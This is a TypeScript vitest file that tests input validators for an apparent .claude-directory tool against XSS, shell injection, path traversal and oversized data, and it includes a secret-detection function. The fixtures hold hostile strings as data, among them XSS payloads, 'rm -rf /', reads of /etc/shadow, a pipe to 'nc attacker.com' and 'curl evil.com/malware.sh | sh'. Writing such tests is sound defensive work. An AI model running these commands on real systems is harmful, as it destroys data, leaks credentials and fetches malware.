/**
 * Security Tests: Input Validation
 * Tests for XSS, command injection, path traversal prevention
 */

import { describe, it, expect } from "vitest";
import { z } from "zod";

describe("Security: Input Validation", () => {
  describe("XSS Prevention", () => {
    const dangerousInputs = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg/onload=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      "<iframe src=\"javascript:alert('XSS')\">",
      "<body onload=alert('XSS')>",
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
      "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
    ];

    it("should sanitize vision input to prevent XSS", () => {
      const VisionInputSchema = z
        .string()
        .max(1000)
        .refine((val) => !/<script|javascript:|onerror=|onload=/i.test(val), {
          message: "Input contains potentially dangerous content",
        });

      dangerousInputs.forEach((input) => {
        const result = VisionInputSchema.safeParse(input);
        expect(result.success).toBe(false);
      });
    });

    it("should sanitize command arguments to prevent injection", () => {
      const CommandArgSchema = z
        .string()
        .max(500)
        .refine((val) => !/[<>{}();&|$`]/.test(val), {
          message: "Input contains shell metacharacters",
        });

      const maliciousArgs = [
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1234",
        "test `whoami`",
        "test $(cat /etc/shadow)",
        "test & background_task",
        "test > /dev/null; malicious",
      ];

      maliciousArgs.forEach((arg) => {
        const result = CommandArgSchema.safeParse(arg);
        expect(result.success).toBe(false);
      });
    });

    it("should validate file paths to prevent path traversal", () => {
      const SafePathSchema = z
        .string()
        .refine((val) => !val.includes(".."), {
          message: "Path traversal detected",
        })
        .refine(
          (val) =>
            val.startsWith(".claude/") || val.startsWith("/project/.claude/"),
          {
            message: "Path must be within .claude directory",
          },
        )
        .refine((val) => !/[<>"|?*]/.test(val), {
          message: "Path contains invalid characters",
        });

      const maliciousPaths = [
        "../../../etc/passwd",
        ".claude/../../secret.key",
        "..\\..\\windows\\system32",
        "/etc/passwd",
        ".claude/<script>alert()</script>",
        ".claude/file|pipe",
      ];

      maliciousPaths.forEach((path) => {
        const result = SafePathSchema.safeParse(path);
        expect(result.success).toBe(false);
      });

      // Valid paths should pass
      const validPaths = [
        ".claude/VISION.md",
        ".claude/state/current.json",
        "/project/.claude/vision-events.json",
      ];

      validPaths.forEach((path) => {
        const result = SafePathSchema.safeParse(path);
        expect(result.success).toBe(true);
      });
    });
  });

  describe("Command Injection Prevention", () => {
    it("should prevent shell command injection in forge commands", () => {
      const ForgeCommandSchema = z.object({
        command: z.enum(["status", "feature", "test", "deploy", "optimize"]),
        args: z.array(
          z
            .string()
            .max(200)
            .regex(/^[a-zA-Z0-9_\-./]+$/),
        ),
      });

      const maliciousCommands = [
        { command: "status", args: ["test; rm -rf /"] },
        { command: "feature", args: ["$(cat /etc/passwd)"] },
        { command: "deploy", args: ["app && curl evil.com/malware.sh | sh"] },
        { command: "test", args: ["`whoami`"] },
      ];

      maliciousCommands.forEach((cmd) => {
        const result = ForgeCommandSchema.safeParse(cmd);
        expect(result.success).toBe(false);
      });
    });

    it("should validate git operations to prevent injection", () => {
      const GitOperationSchema = z.object({
        operation: z.enum(["commit", "push", "pull", "branch", "checkout"]),
        message: z
          .string()
          .max(500)
          .regex(/^[a-zA-Z0-9\s_\-.,!?()[\]{}:;'"]+$/, {
            message: "Commit message contains invalid characters",
          }),
        branch: z
          .string()
          .max(100)
          .regex(/^[a-zA-Z0-9_\-./]+$/)
          .optional(),
      });

      const maliciousGitOps = [
        {
          operation: "commit",
          message: "Update code\n\n`curl evil.com | sh`",
          branch: "main",
        },
        {
          operation: "push",
          message: "Deploy; rm -rf /",
          branch: "feature/hack",
        },
      ];

      maliciousGitOps.forEach((op) => {
        const result = GitOperationSchema.safeParse(op);
        expect(result.success).toBe(false);
      });
    });
  });

  describe("File System Access Control", () => {
    it("should restrict file operations to .claude directory", () => {
      const isPathSafe = (filePath: string): boolean => {
        const normalizedPath = filePath.replace(/\\/g, "/");

        // Must be within .claude directory
        if (!normalizedPath.includes(".claude/")) {
          return false;
        }

        // No path traversal
        if (normalizedPath.includes("..")) {
          return false;
        }

        // No absolute paths outside project
        if (
          normalizedPath.startsWith("/") &&
          !normalizedPath.includes("/project/.claude/")
        ) {
          return false;
        }

        return true;
      };

      const unsafePaths = [
        "/etc/passwd",
        "../../../secret.key",
        "config/database.yml",
        "/home/user/.ssh/id_rsa",
        "C:\\Windows\\System32\\config",
        ".claude/../../../etc/hosts",
      ];

      unsafePaths.forEach((path) => {
        expect(isPathSafe(path)).toBe(false);
      });

      const safePaths = [
        ".claude/VISION.md",
        ".claude/state/current.json",
        "/project/.claude/vision-events.json",
        ".claude/agents/developer.md",
      ];

      safePaths.forEach((path) => {
        expect(isPathSafe(path)).toBe(true);
      });
    });

    it("should validate file extensions for allowed types", () => {
      const AllowedFileSchema = z.string().refine(
        (val) => {
          const allowedExtensions = [
            ".md",
            ".json",
            ".jsonl",
            ".yml",
            ".yaml",
            ".log",
          ];
          return allowedExtensions.some((ext) => val.endsWith(ext));
        },
        {
          message: "File type not allowed",
        },
      );

      const dangerousFiles = [
        ".claude/script.sh",
        ".claude/binary.exe",
        ".claude/malware.dll",
        ".claude/code.js",
        ".claude/app.py",
      ];

      dangerousFiles.forEach((file) => {
        const result = AllowedFileSchema.safeParse(file);
        expect(result.success).toBe(false);
      });

      const safeFiles = [
        ".claude/VISION.md",
        ".claude/state.json",
        ".claude/events.jsonl",
        ".claude/config.yml",
      ];

      safeFiles.forEach((file) => {
        const result = AllowedFileSchema.safeParse(file);
        expect(result.success).toBe(true);
      });
    });
  });

  describe("Data Size Limits", () => {
    it("should enforce maximum vision input size", () => {
      const VisionDataSchema = z.object({
        mission: z.string().max(1000),
        goals: z.array(z.string().max(500)).max(20),
        constraints: z.array(z.string().max(500)).max(20),
        successMetrics: z.array(z.string().max(500)).max(20),
        timeframe: z.string().max(200),
      });

      const oversizedData = {
        mission: "a".repeat(1001),
        goals: Array(21).fill("goal"),
        constraints: ["test"],
        successMetrics: ["test"],
        timeframe: "test",
      };

      const result = VisionDataSchema.safeParse(oversizedData);
      expect(result.success).toBe(false);
    });

    it("should prevent DoS through large state files", () => {
      const StateDataSchema = z.object({
        currentTasks: z.array(z.any()).max(1000),
        agentStates: z
          .record(z.any())
          .refine((states) => Object.keys(states).length <= 100, {
            message: "Too many agents",
          }),
        conversationContext: z.object({
          recentMessages: z.array(z.any()).max(100),
        }),
      });

      const oversizedState = {
        currentTasks: Array(1001).fill({}),
        agentStates: {},
        conversationContext: {
          sessionId: "test",
          startedAt: new Date(),
          lastInteraction: new Date(),
          messageCount: 0,
          recentMessages: [],
          contextTags: [],
        },
      };

      const result = StateDataSchema.safeParse(oversizedState);
      expect(result.success).toBe(false);
    });
  });

  describe("Secret Detection", () => {
    it("should detect hardcoded API keys", () => {
      const detectSecrets = (content: string): boolean => {
        const secretPatterns = [
          /api[_-]?key\s*=\s*['"][a-zA-Z0-9]{20,}['"]/i,
          /secret[_-]?key\s*=\s*['"][a-zA-Z0-9]{20,}['"]/i,
          /password\s*=\s*['"][^'"]{8,}['"]/i,
          /token\s*=\s*['"][a-zA-Z0-9]{20,}['"]/i,
          /sk-[a-zA-Z0-9]{48}/, // OpenAI API key
          /github_pat_[a-zA-Z0-9]{82}/, // GitHub PAT
          /AIza[a-zA-Z0-9_\-]{35}/, // Google API key
        ];

        return secretPatterns.some((pattern) => pattern.test(content));
      };

      const codeWithSecrets = [
        'const api_key = "sk-1234567890abcdef1234567890abcdef1234567890abcdef"',
        'const password = "SuperSecretPassword123!"',
        'const secret_key = "hardcodedsecretvalue12345678901234567890"',
        'const token = "github_pat_' + 'A'.repeat(82) + '"',
      ];

      codeWithSecrets.forEach((code) => {
        expect(detectSecrets(code)).toBe(true);
      });

      const codeWithoutSecrets = [
        "const apiKey = process.env.API_KEY",
        "const config = loadFromEnv()",
        "const token = await getAuthToken()",
        "const password = getUserInput()",
      ];

      codeWithoutSecrets.forEach((code) => {
        expect(detectSecrets(code)).toBe(false);
      });
    });
  });

  describe("Rate Limiting", () => {
    it("should enforce rate limits on command execution", () => {
      class RateLimiter {
        private requests: Map<string, number[]> = new Map();
        private readonly maxRequests = 10;
        private readonly windowMs = 60000; // 1 minute

        isAllowed(userId: string): boolean {
          const now = Date.now();
          const userRequests = this.requests.get(userId) || [];

          // Remove old requests outside window
          const validRequests = userRequests.filter(
            (time) => now - time < this.windowMs,
          );

          if (validRequests.length >= this.maxRequests) {
            return false;
          }

          validRequests.push(now);
          this.requests.set(userId, validRequests);
          return true;
        }
      }

      const limiter = new RateLimiter();

      // First 10 requests should succeed
      for (let i = 0; i < 10; i++) {
        expect(limiter.isAllowed("user1")).toBe(true);
      }

      // 11th request should fail
      expect(limiter.isAllowed("user1")).toBe(false);

      // Different user should still be allowed
      expect(limiter.isAllowed("user2")).toBe(true);
    });
  });
});
